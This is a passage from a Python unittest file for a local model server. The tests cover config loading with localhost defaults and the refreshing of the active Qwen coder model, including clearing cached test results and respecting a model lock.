            with patch.object(server, "CONFIG_PATH", config_path):
                config = server.load_config()
            self.assertEqual(config["ollama_url"], "http://127.0.0.1:11434")
            self.assertEqual(config["bind_host"], "127.0.0.1")

    def test_refresh_active_coder_model_invalidates_previous_tests(self):
        with tempfile.TemporaryDirectory() as temp:
            config_path = Path(temp) / "config.json"
            config_path.write_text(json.dumps({"coder_model": "qwen2.5-coder:3b"}), encoding="utf-8")
            old_model = server.CONFIG["coder_model"]
            old_tests = dict(server.MODEL_TESTS)
            old_job = server.JOB
            try:
                server.CONFIG["coder_model"] = "qwen2.5-coder:1.5b"
                server.MODEL_TESTS.update({"coder_test": {"ok": True}, "auditor_test": {"ok": True}})
                server.JOB = None
                with patch.object(server, "CONFIG_PATH", config_path):
                    self.assertTrue(server.refresh_active_coder_model())
                self.assertEqual(server.CONFIG["coder_model"], "qwen2.5-coder:3b")
                self.assertEqual(server.MODEL_TESTS, {})
            finally:
                server.CONFIG["coder_model"] = old_model
                server.MODEL_TESTS.clear()
                server.MODEL_TESTS.update(old_tests)
                server.JOB = old_job

    def test_refresh_active_coder_model_does_not_change_during_model_lock(self):
        with tempfile.TemporaryDirectory() as temp:
            config_path = Path(temp) / "config.json"
            config_path.write_text(json.dumps({"coder_model": "qwen2.5-coder:3b"}), encoding="utf-8")
            old_model = server.CONFIG["coder_model"]
            try:
                server.CONFIG["coder_model"] = "qwen2.5-coder:1.5b"
                with patch.object(server, "CONFIG_PATH", config_path):
                    server.MODEL_LOCK.acquire()
                    try:
                        self.assertFalse(server.refresh_active_coder_model())
                        self.assertEqual(server.CONFIG["coder_model"], "qwen2.5-coder:1.5b")
                    finally:
                        server.MODEL_LOCK.release()
            finally:
                server.CONFIG["coder_model"] = old_model


if __name__ == "__main__":
    unittest.main(verbosity=2)
